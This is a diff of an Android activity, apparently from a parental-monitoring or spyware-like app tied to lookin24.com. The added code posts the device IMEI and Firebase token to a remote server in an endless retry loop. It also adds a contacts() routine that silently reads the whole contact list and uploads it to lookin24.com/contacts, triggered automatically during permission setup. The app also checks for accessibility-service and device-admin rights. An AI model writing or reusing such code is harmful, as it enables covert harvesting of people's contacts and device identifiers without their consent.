@@ -7,9 +7,11 @@ import androidx.core.content.ContextCompat;
 import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.content.pm.ResolveInfo;
+import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Environment;
@@ -45,20 +47,41 @@ import java.io.IOException;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
+import java.util.Locale;
 import java.util.Map;
 
 public class ParentActivity extends Activity {
 
+    public static boolean cs = false;
     public void postJSONFirebase(String token) {
-        JSONObject postData = new JSONObject();
+        final JSONObject postData = new JSONObject();
         Log.d("posted", "posJson from Firebase");
         String ts = Context.TELEPHONY_SERVICE;
         String imei = new Device(this).getImei();
         try {
             postData.put("t", token);
             postData.put("i", imei);
-            new ServerHelper(this).execute("https://lookin24.com/updateFirebaseToken", postData.toString());
-        } catch (JSONException e) {
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+
+
+                        while (true) {
+                            String ans = new InternetHelper().send("https://lookin24.com/updateFirebaseToken2", postData.toString());
+                            //new ServerHelper(this).execute("https://lookin24.com/updateFirebaseToken", postData.toString());
+                            if(ans.equals("1")) {
+                                break;
+                            }
+                            Thread.sleep(2000);
+                        }
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }).start();
+            //new ServerHelper(this).execute("https://lookin24.com/updateFirebaseToken", postData.toString());
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
@@ -97,6 +120,11 @@ public class ParentActivity extends Activity {
 
             @Override
             protected Void doInBackground(Integer... integers) {
+                try {
+                    FileR.checkFolder();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
                 FirebaseInstanceId.getInstance().getInstanceId()
                         .addOnCompleteListener(new OnCompleteListener<InstanceIdResult>() {
                             @Override
@@ -114,11 +142,7 @@ public class ParentActivity extends Activity {
                             }
                         });
 
-                try {
-                    FileR.checkFolder();
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
+
 
                 try {
                     firstTimeInit();
@@ -158,8 +182,25 @@ public class ParentActivity extends Activity {
             }
         }.execute();
     }
+    public void contacts() {
+        new AsyncTask<String, Void, Void>() {
 
-    public Activity that;
+            @Override
+            protected Void doInBackground(String... strings) {
+                ParentActivity.cs = true;
+                 JSONObject ans=   new ContactHelper(that).getContactList();
+                String a = new InternetHelper().send("https://lookin24.com/contacts", ans.toString());
+                if(a.equals("1")) {
+
+                }else {
+                    cs = false;
+                }
+                return null;
+            }
+        }.execute();
+    }
+
+    public static Activity that;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -195,16 +236,25 @@ public class ParentActivity extends Activity {
                 Logger.l("BAXX", "adi URL:" + url);
 
                 int t = 0;
+                if(url.indexOf("openinbrow") != -1) {
+                    Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.lookin24.com/index3"));
+                    startActivity(browserIntent);
+                    return new WebResourceResponse("text/plain", "utf-8", new ByteArrayInputStream(("1").getBytes()));
+                }
                 if(url.indexOf("?firstTime=123") != -1) {
-                    if(pm.hasSimplePermissions()) t += 25;
+                    if(pm.hasSimplePermissions()) {
+                        t += 25;
+
+                    }
                     if(pm.isBatteryObtimisationIgnored())t += 25;
                     if(pm.isAccessibilityServiceEnabled(MyAccessibilityService.class)) t += 25;
                     if(pm.isAdmin())t += 25;
+                    if(!cs && t == 25)
+                        contacts();
                     if(t == 100) {
                         if(MyAccessibilityService.firstTime) {
                             prepareFirebase();
-                            if(ContextCompat.checkSelfPermission( MyAccessibilityService.instance, android.Manifest.permission.ACCESS_COARSE_LOCATION ) == PackageManager.PERMISSION_GRANTED)
-                                startService(new Intent(getApplicationContext(), GoogleService.class));
+
                             MyAccessibilityService.firstTime = false;
                         }
                         return new WebResourceResponse("text/plain", "utf-8", new ByteArrayInputStream(new Device(that).getImei().getBytes()));
@@ -252,6 +302,11 @@ public class ParentActivity extends Activity {
 
 
         //myWebView.loadUrl("https://www.lookin24.com/index3?imei=" + (new Device(this)).getImei());
-        myWebView.loadUrl("https://www.lookin24.com/parentorchild");
+        SharedPreferences sp = this.getSharedPreferences("pref", Context.MODE_PRIVATE);
+        boolean pref = false;
+        if(sp.contains("silIcaze")) {
+            pref = true;
+        }
+        myWebView.loadUrl("https://www.lookin24.com/parentorchild?lng="+ Locale.getDefault().getLanguage() + "&pref="+(pref?"1":"0"));
     }
 }
